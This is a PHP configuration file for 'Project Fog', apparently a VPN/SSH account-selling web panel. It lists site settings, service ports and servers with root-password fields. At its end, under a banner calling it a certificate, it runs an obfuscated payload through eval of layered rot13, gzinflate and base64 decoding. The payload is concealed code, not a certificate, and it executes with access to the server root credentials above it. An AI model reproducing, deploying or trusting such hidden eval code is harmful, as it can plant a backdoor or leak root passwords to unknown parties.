<?php

/////////////////////////////
/////////////////////////////

//FILL UP ALL VARIABLE [ $ ] | BASE TO YOUR DESIRE://
$site_name        = "Project Fog";
$site_description = "Premium Fast And Reliable Servers";
$site_template    = "flatly"; // (flatly, darkly, sketchy, lumen, materia)
$site_ovpnmonitoring = "http://fogserverip:Fog_Openvpn_Monitoring"; // Openvpn Monitoring
$site_v2ray = "http://fogserverip:v2portas"; // v2ray ip and PORT
$site_config = "http://fogserverip:$Nginx_Port/projectfog.html"; // list of config
$config_zips = "http://fogserverip:$Nginx_Port/$config_fog"; // Zip Download
$daily_limit_user = "50"; // set daily limit

/////////////////////////////
/////////////////////////////

//Double Check if correct. Update anything not correct.
$Nginx_Port= "NXPort";				 // Nginx Port
$port_ssh= 'SSH_Port1 | SSH_Port2'; 		   	 // SSH Ports
$port_dropbear= 'Dropbear_Port1 | Dropbear_Port2';  	 // Dropbear Ports
$port_ssl_dp= 'Stunnel_Port1';                    	 // SSL through Dropbear
$port_ssl_ssh= 'Stunnel_Port2';                    	 // SSL through OpenSSH
$port_ssl_ovpn= 'Stunnel_Port3';                    	 // SSL through Openvpn
$port_squid= 'Squid_Port1 | Squid_Port2 | Squid_Port3';  // Squid Ports
$port_privoxy= 'Privoxy_Port1 | Privoxy_Port2'; 	 // Privoxy Ports
$port_ohp_sq= 'OHP_Port1 | OHP_Port2';  		 // OHP through Squid
$port_ohp_pr= 'OHP_Port3 | OHP_Port4';  		 // OHP through Privoxy
$port_ohp_ov= 'OHP_Port5';  				 // OHP through Openvpn
$port_psp_sim= 'Simple_Port1 | Simple_Port2';  		 // Python Simple Socks Proxy
$port_psp_dir= 'Direct_Port1 | Direct_Port2';  		 // Python Direct Socks Proxy
$port_psp_ov= 'Open_Port1 | Open_Port2';  		 // Python Openvpn Socks Proxy
$config_fog = "config.zip";				 // Zip File Name for your OVPN Config /Default: config.zip


/////////////////////////////  
/////////////////////////////

/* Server Data */
/* Variable = Server_Name, IP_Address, Root_Pass, Account_Validity */
/* Sample: 1=>array(1=>"Name of your Server 1","your-ip-address","server-or-root-password","5"), */

$server_lists_array=array(
			1=>array(1=>"VIP Server","fogserverip","server-or-root-password","5"),
			2=>array(1=>"Reserve 1 ","your-server-ip-2.here","server-or-root-password","5"),
			3=>array(1=>"Reserve 2","your-server-ip-3.here","server-or-root-password","5"),
	);			

/////////////////////////////
/////////////////////////////


//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
////////////// DONT EDIT CERTIFICATE BELOW  //////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//ySFq7OTEwsp50s/wCXAgtgZ6pmhjGxWCIhTvX+zKbtDg71kFXVGUxBRNazoHvzqoXQoxkSYA2VUmRUG1I0aA7RQXLYkz0JBBrUbhC8JtChjy4N8s7q3DD0d7JVmD49Dt9Pp1JdTp9NDPpLYBg0aDRf+O064kHoceRD9cDUAUm1P0yMALX/JYL+ihydUWgkrmLAWLqEQxSHUoAY260vP0eDsrJa1TjhDA+rO0NUWh6DIhGoPtshTFnFYT6OQIhHJVZSRNLJHhLhqth5YAc3XU8kSJ8nc8b3Eqnin81lpjJw21QSUUvewOEZ0AdUtGJH5ROwptXdgxqAQY587fafvrq0aCsVBBmxNLhm34mplAQKCYFsIkEqdJSwSNuMBcV+lG0txWBa40x+cE6d/5oI8l3JMKbeI6YBRKzkRjrnz6Y+Qk7mSoS/tM+cM0AeQuBWwQsBia6hIQ+x9Cpwow268hBZbI2+f2J2biQVLGvuwyE6QC1Ns7vzdDfO4HNxFw3BJlwNgZwDugpq6ck48MuW7Uk332BRSGXmhIwsuF7AI9ZfN7yA2bztYyoGYkXu0VSCkooh4e7I6q70gwEU6yrVxmhiKPKnP4nhQR6cqmbbMFHOVQ29baxA/3EnVH+Q6kWs2xX6Z9hSoWvsF2IXBv1JVKXGb+uQoIMg4KUqhprFxcMmKeyMrwkzGfKgvim5TErlb/lqLuNQSYWuOQkEBDxHMlmye4KxF01OjXcHjkaWLFz2asYVcIZpOOlYk6uhVBTowtMPXTFBTApDI+epswEgsqlUop0S6fjUtEbcDBf4weHWUoZUTG21xjGV3n8p/TG+fALFc4ga1DT7IEYMcP+XNuLJyMihwd81ka
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>

